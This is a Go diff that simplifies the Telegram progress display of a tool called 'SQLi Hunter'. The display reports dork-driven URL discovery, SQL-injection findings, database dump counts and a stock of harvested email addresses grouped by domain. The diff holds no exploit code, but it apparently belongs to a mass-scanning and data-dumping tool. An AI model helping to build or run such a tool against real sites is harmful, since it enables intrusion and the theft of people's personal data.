@@ -15,7 +15,7 @@ const (
 
 // BoardState état affiché dans le message live Telegram.
 type BoardState struct {
-	Phase string // discover, fresh-pass, scan, done, no-new, error
+	Phase string // discover, fresh-pass, scan, done, stopped, no-new, error
 
 	DiscoverLabel string
 	DorkStep      int
@@ -44,263 +44,99 @@ type BoardState struct {
 
 // RenderBoard formate le message live complet (rétrocompat tests).
 func RenderBoard(loc string, st BoardState) string {
-	if st.Phase == "scan" || st.Phase == "done" || st.ScanDone {
+	if st.Phase == "scan" || st.Phase == "done" || st.Phase == "stopped" || st.ScanDone {
 		return RenderScanBoard(loc, st)
 	}
 	return RenderDiscoverBoard(loc, st)
 }
 
-// RenderDiscoverBoard — message live pendant la découverte uniquement.
+// RenderDiscoverBoard — stats discover (legacy).
 func RenderDiscoverBoard(loc string, st BoardState) string {
-	l := labelsForBoard(loc)
-	var b strings.Builder
-
-	b.WriteString("🎯 SQLi Hunter\n")
-	b.WriteString("━━━━━━━━━━━━━━━━━━━━")
-
 	if st.Error != "" {
-		b.WriteString("\n\n❌ ")
-		b.WriteString(st.Error)
+		return "❌ " + st.Error
 	}
-
-	b.WriteString("\n\n")
-	b.WriteString(renderDiscoverSection(l, st))
-
-	if len(st.URLsList) > 0 {
-		b.WriteString("\n\n")
-		b.WriteString(l.urlsHeader)
-		b.WriteString("\n")
-		for _, u := range st.URLsList {
-			b.WriteString("  🔗 ")
-			b.WriteString(compactURL(u, 58))
-			b.WriteString("\n")
-		}
-		if st.Kept > len(st.URLsList) {
-			b.WriteString(fmt.Sprintf("  "+l.urlsMore, st.Kept-len(st.URLsList)))
-			b.WriteString("\n")
-		}
-	}
-
-	return strings.TrimRight(b.String(), "\n")
-}
-
-// RenderScanBoard — message live pendant le scan (nouveau message après discover).
-func RenderScanBoard(loc string, st BoardState) string {
-	l := labelsForBoard(loc)
-	var b strings.Builder
-
-	b.WriteString("🎯 SQLi Hunter\n")
-	b.WriteString("━━━━━━━━━━━━━━━━━━━━")
-
-	if st.Error != "" {
-		b.WriteString("\n\n❌ ")
-		b.WriteString(st.Error)
-	}
-
-	b.WriteString("\n\n")
-	b.WriteString(renderScanSection(l, st))
-
-	if len(st.VulnsList) > 0 {
-		b.WriteString("\n\n")
-		b.WriteString(l.vulnsHeader)
-		b.WriteString("\n")
-		for _, f := range st.VulnsList {
-			b.WriteString("  ")
-			b.WriteString(vulnEmoji(f.VulnType))
-			b.WriteString(" ")
-			b.WriteString(shortVulnLine(f))
-			b.WriteString("\n")
-		}
-		if st.Vulns > len(st.VulnsList) {
-			b.WriteString(fmt.Sprintf("  "+l.vulnsMore, st.Vulns-len(st.VulnsList)))
-			b.WriteString("\n")
-		}
-	}
-
-	if len(st.EmailsList) > 0 {
-		b.WriteString("\n\n")
-		b.WriteString(l.emailsHeader)
-		b.WriteString("\n")
-		for _, em := range st.EmailsList {
-			b.WriteString("  ✉️ ")
-			b.WriteString(em)
-			b.WriteString("\n")
-		}
-	}
-
-	if st.ScanDone || st.Phase == "done" {
-		if st.Detail != "" {
-			b.WriteString("\n\n🏁 ")
-			b.WriteString(st.Detail)
-		}
-		if st.Stock != "" {
-			b.WriteString("\n\n📦 ")
-			b.WriteString(st.Stock)
-		}
-	}
-
-	return strings.TrimRight(b.String(), "\n")
-}
-
-type boardL10n struct {
-	discoverHeader, discoverDone string
-	freshPass, discoverMain      string
-	scanHeader, scanDone, scanWait string
-	scanWaitLine                 string
-	dorks, pages                 string
-	statsKept                    string
-	urlsHeader, urlsMore         string
-	vulnsHeader, vulnsMore       string
-	dumpsLine                    string
-	emailsHeader                 string
-}
-
-func labelsForBoard(loc string) boardL10n {
-	if loc == "en" {
-		return boardL10n{
-			discoverHeader: "🔍 DISCOVERY",
-			discoverDone:   "✅ Discovery done",
-			freshPass:      "⚡ Fresh pass",
-			discoverMain:   "🌐 Discover",
-			scanHeader:     "🛡 SCAN",
-			scanDone:       "✅ Scan done",
-			scanWait:       "🛡 SCAN",
-			scanWaitLine:   "⏳ Waiting…",
-			dorks:          "dorks",
-			pages:          "pages",
-			statsKept:      "📌 %d URLs",
-			urlsHeader:     "🔗 Latest URLs",
-			urlsMore:       "… +%d more",
-			vulnsHeader:    "🔥 Vulnerabilities",
-			vulnsMore:      "… +%d more",
-			dumpsLine:      "💾 %d OK · %d failed",
-			emailsHeader:   "📬 New emails",
-		}
-	}
-	return boardL10n{
-		discoverHeader: "🔍 DÉCOUVERTE",
-		discoverDone:   "✅ Terminée",
-		freshPass:      "⚡ Fresh pass",
-		discoverMain:   "🌐 Discover",
-		scanHeader:     "🛡 SCAN",
-		scanDone:       "✅ Terminé",
-		scanWait:       "🛡 SCAN",
-		scanWaitLine:   "⏳ En attente…",
-		dorks:          "dorks",
-		pages:          "pages",
-		statsKept:      "📌 %d URLs",
-		urlsHeader:     "🔗 Dernières URLs",
-		urlsMore:       "… +%d autres",
-		vulnsHeader:    "🔥 Vulnérabilités",
-		vulnsMore:      "… +%d autres",
-		dumpsLine:      "💾 %d OK · %d échecs",
-		emailsHeader:   "📬 Nouveaux emails",
-	}
-}
-
-func renderDiscoverSection(l boardL10n, st BoardState) string {
-	var b strings.Builder
-	showProgress := st.Phase == "discover" || st.Phase == "fresh-pass" || st.Phase == "error"
-	switch {
-	case st.DiscoverDone || st.Phase == "scan" || st.Phase == "done" || st.Phase == "no-new":
-		b.WriteString(l.discoverHeader)
-		b.WriteString("\n")
-		b.WriteString(l.discoverDone)
-	case st.Phase == "fresh-pass":
-		b.WriteString(l.discoverHeader)
-		b.WriteString("\n")
-		b.WriteString(l.freshPass)
-	case st.Phase == "discover" || st.Phase == "error":
-		b.WriteString(l.discoverHeader)
-		b.WriteString("\n")
-		b.WriteString(l.discoverMain)
-	default:
-		b.WriteString(l.discoverHeader)
-	}
-
-	if st.DiscoverDone || st.Phase == "scan" || st.Phase == "done" || st.Phase == "no-new" {
-		b.WriteString("\n")
+	if st.DiscoverDone || st.Phase == "scan" || st.Phase == "done" {
 		if st.DorkTotal > 0 {
-			b.WriteString(fmt.Sprintf("📌 %d URLs · %d/%d %s", st.Kept, max(st.DorkStep, st.DorkTotal), st.DorkTotal, l.dorks))
-		} else {
-			b.WriteString(fmt.Sprintf(l.statsKept, st.Kept))
+			return fmt.Sprintf("🔍 %d/%d · 📌 %d URLs", max(st.DorkStep, st.DorkTotal), st.DorkTotal, st.Kept)
 		}
-		return b.String()
+		return fmt.Sprintf("🔍 📌 %d URLs", st.Kept)
 	}
-
-	if showProgress {
-		if st.DorkTotal > 0 || st.DorkStep > 0 {
-			b.WriteString("\n")
-			if st.DorkTotal > 0 {
-				b.WriteString(progressBar(st.DorkStep, st.DorkTotal))
-				b.WriteString(fmt.Sprintf(" %d/%d %s", st.DorkStep, st.DorkTotal, l.dorks))
-			} else {
-				b.WriteString(progressBar(st.DorkStep, 0))
-				b.WriteString(fmt.Sprintf(" %s %d", l.pages, st.DorkStep))
-			}
-		} else {
-			b.WriteString("\n⏳ Démarrage…")
+	if st.DorkTotal > 0 {
+		line := fmt.Sprintf("🔍 %s %d/%d", progressBar(st.DorkStep, st.DorkTotal), st.DorkStep, st.DorkTotal)
+		if st.Kept > 0 || st.Fetched > 0 {
+			line += fmt.Sprintf(" · 📌 %d", st.Kept)
 		}
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf(l.statsKept, st.Kept))
-		if st.Fetched > 0 {
-			b.WriteString(fmt.Sprintf(" · %d lues", st.Fetched))
-		}
-		return b.String()
+		return line
 	}
-
-	b.WriteString("\n⏳ Démarrage…")
-	return b.String()
+	return "🔍 …"
 }
 
-func renderScanSection(l boardL10n, st BoardState) string {
-	var b strings.Builder
-	switch {
-	case st.ScanDone || st.Phase == "done":
-		b.WriteString(l.scanDone)
-	case st.Phase == "scan":
-		b.WriteString(l.scanHeader)
-	default:
-		b.WriteString(l.scanHeader)
+// RenderScanBoard — stats scan uniquement (1 message live édité).
+func RenderScanBoard(loc string, st BoardState) string {
+	if st.Error != "" {
+		return "❌ " + st.Error
 	}
 
-	if st.Kept > 0 && (st.Phase == "scan" || st.ScanDone || st.Phase == "done") {
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf(l.statsKept, st.Kept))
-	}
-
-	if st.ScanTotal <= 0 && st.Phase == "scan" && st.Scanned == 0 {
-		b.WriteString("\n")
-		b.WriteString(l.scanWaitLine)
+	switch st.Phase {
+	case "stopped":
+		return scanStatsLine(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK, "⏹")
+	case "done", "no-new":
+		var b strings.Builder
+		b.WriteString("✅ ")
+		b.WriteString(scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
+		if st.NewEmails > 0 {
+			b.WriteString(fmt.Sprintf(" · 📬 +%d", st.NewEmails))
+		}
+		if compact := compactStock(st.Stock); compact != "" {
+			b.WriteString("\n📦 ")
+			b.WriteString(compact)
+		}
 		return b.String()
 	}
 
-	b.WriteString("\n")
 	if st.ScanTotal > 0 {
-		b.WriteString(progressBar(st.Scanned, st.ScanTotal))
-		b.WriteString(fmt.Sprintf(" %d/%d URLs", st.Scanned, st.ScanTotal))
-	} else if st.Scanned > 0 {
-		b.WriteString(fmt.Sprintf("📊 %d", st.Scanned))
+		return fmt.Sprintf("🛡 %s %s", progressBar(st.Scanned, st.ScanTotal), scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
 	}
+	return fmt.Sprintf("🛡 %s", scanStatsCore(st.Scanned, st.ScanTotal, st.Vulns, st.Findings, st.DumpsOK))
+}
 
-	if st.Vulns > 0 || st.Findings > 0 {
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf("🔴 %d vuln · 🔎 %d", st.Vulns, st.Findings))
-	}
-	if st.DumpsOK > 0 || st.DumpFails > 0 {
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf(l.dumpsLine, st.DumpsOK, st.DumpFails))
-	}
-	if st.NewEmails > 0 && (st.ScanDone || st.Phase == "done") {
-		b.WriteString("\n")
-		b.WriteString(fmt.Sprintf("📬 +%d emails", st.NewEmails))
-	}
+func scanStatsLine(scanned, total, vulns, findings, dumps int, prefix string) string {
+	return prefix + " " + scanStatsCore(scanned, total, vulns, findings, dumps)
+}
 
-	return b.String()
+func scanStatsCore(scanned, total, vulns, findings, dumps int) string {
+	if total > 0 {
+		return fmt.Sprintf("%d/%d · 🔴 %d · 🔎 %d · 💾 %d", scanned, total, vulns, findings, dumps)
+	}
+	return fmt.Sprintf("🔴 %d · 🔎 %d · 💾 %d", vulns, findings, dumps)
+}
+
+func compactStock(stock string) string {
+	stock = strings.TrimSpace(stock)
+	if stock == "" {
+		return ""
+	}
+	lines := strings.Split(stock, "\n")
+	if len(lines) == 0 {
+		return ""
+	}
+	// "stock emails:\n• gmail.com — 12" → "gmail 12 · bluewin 5"
+	var parts []string
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasSuffix(line, ":") || strings.Contains(line, "vide") || strings.Contains(line, "empty") {
+			continue
+		}
+		line = strings.TrimPrefix(line, "• ")
+		line = strings.TrimPrefix(line, "- ")
+		line = strings.ReplaceAll(line, " — ", " ")
+		parts = append(parts, line)
+	}
+	return strings.Join(parts, " · ")
 }
 
 func progressBar(step, total int) string {
-	const width = 14
+	const width = 10
 	if step <= 0 {
 		return strings.Repeat("░", width)
 	}
@@ -310,7 +146,7 @@ func progressBar(step, total int) string {
 		if filled > width {
 			filled = width
 		}
-		if filled < 1 {
+		if filled < 1 && step > 0 {
 			filled = 1
 		}
 	}
